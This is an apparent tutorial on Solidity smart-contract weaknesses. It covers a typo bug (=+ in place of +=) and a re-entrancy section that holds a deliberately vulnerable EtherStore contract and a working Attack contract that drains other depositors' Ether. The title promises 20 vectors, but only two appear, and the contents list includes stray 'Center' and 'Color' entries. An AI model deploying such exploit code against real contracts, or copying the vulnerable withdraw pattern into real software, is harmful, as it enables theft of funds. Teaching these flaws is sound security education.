# 20 ATTACK VECTORS
- [Typographical Error](#typography)
- [Re-Entrancy Attack](#reentrancy)
- [Center](#center)
- [Color](#color)

## <font color="yellow">Typographical Error <a id="typography"></a></font>

### Description
*A typographical error can occur **for example** when the intent of a defined operation is to sum a number to a variable (+=) but it has accidentally been defined in a wrong way (=+), introducing a typo which happens to be a valid operator. Instead of calculating the sum it initializes the variable again.*

### Code sample
```solidity
// SPDX-License-Identifier: MIT

pragma solidity ^0.4.25;

//the compiler version is old hence the error will persist;
//by default, using a higher compiler version of 0.5.0 and higher, saves you from this error
//because unary operator has been disallowed from solidity version 0.5.0

contract TypoOneCommand {
    uint numberOne = 1;

    function alwaysOne() public {
        //ERROR=>:the next line only re-initialises numberOne to be 1 instead of incrementing it by 1
        numberOne =+ 1;
    }
}
```

### Remediation
The weakness can be avoided in two ways; 1)by performing pre-condition checks on any math operation or using a vetted library for arithmetic calculations such as SafeMath developed by OpenZeppelin. 2)always check and ensure that your solidity compiler version is the latest *stable* version if not the latest version

## <font color="yellow">Re-Entrancy Attack <a id="reentrancy"></a></font> 

### Description
*one major danger of calling external contracts is that they can take over the control flow as described thus: Let's say that contract A calls contract B.*

*Reentracy (a.k.a. recursive call attack) exploit allows B to call back into A before A finishes execution.*

### Code sample
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*
EtherStore is a contract where you can deposit and withdraw ETH.
This contract is vulnerable to re-entrancy attack.
Let's see why.

1. Deploy EtherStore
2. Deposit 1 Ether each from Account 1 (Alice) and Account 2 (Bob) into EtherStore
3. Deploy Attack with address of EtherStore
4. Call Attack.attack sending 1 ether (using Account 3 (Eve)).
   You will get 3 Ethers back (2 Ether stolen from Alice and Bob,
   plus 1 Ether sent from this contract).

What happened?
Attack was able to call EtherStore.withdraw multiple times before
EtherStore.withdraw finished executing.

Here is how the functions were called
- Attack.attack
- EtherStore.deposit
- EtherStore.withdraw
- Attack fallback (receives 1 Ether)
- EtherStore.withdraw
- Attack.fallback (receives 1 Ether)
- EtherStore.withdraw
- Attack fallback (receives 1 Ether)
*/

contract EtherStore {
    mapping(address => uint256) public balances;

    function deposit() public payable {
        balances[msg.sender] += msg.value;
    }

    function withdraw() public {
        uint256 bal = balances[msg.sender];
        require(bal > 0);

        (bool sent,) = msg.sender.call{value: bal}("");
        require(sent, "Failed to send Ether");

        balances[msg.sender] = 0;
    }

    // Helper function to check the balance of this contract
    function getBalance() public view returns (uint256) {
        return address(this).balance;
    }
}

contract Attack {
    EtherStore public etherStore;
    uint256 public constant AMOUNT = 1 ether;

    constructor(address _etherStoreAddress) {
        etherStore = EtherStore(_etherStoreAddress);
    }

    // Fallback is called when EtherStore sends Ether to this contract.
    fallback() external payable {
        if (address(etherStore).balance >= AMOUNT) {
            etherStore.withdraw();
        }
    }

    function attack() external payable {
        require(msg.value >= AMOUNT);
        etherStore.deposit{value: AMOUNT}();
        etherStore.withdraw();
    }

    // Helper function to check the balance of this contract
    function getBalance() public view returns (uint256) {
        return address(this).balance;
    }
}

```